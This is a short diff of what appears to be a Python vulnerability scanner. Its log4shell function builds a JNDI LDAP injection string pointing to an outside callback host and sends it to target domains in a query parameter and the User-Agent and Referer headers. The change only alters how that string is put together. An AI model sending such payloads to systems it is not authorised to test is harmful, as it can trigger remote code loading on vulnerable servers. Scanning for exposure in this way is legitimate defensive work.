@@ -25,7 +25,7 @@ SERVERS = SERVERLIST.split(",")
 
 def log4shell(domain):
     try:
-        payload = f"${jndi:ldap://tracker.alpha.canada.ca:1389/c={domain}}"
+        payload = "${jndi:ldap://tracker.alpha.canada.ca:1389/c=" + domain + "}"
         params = {'id':payload}
         headers = {'User-Agent':payload, 'Referer':payload}
         print(f'Testing https://{domain}')
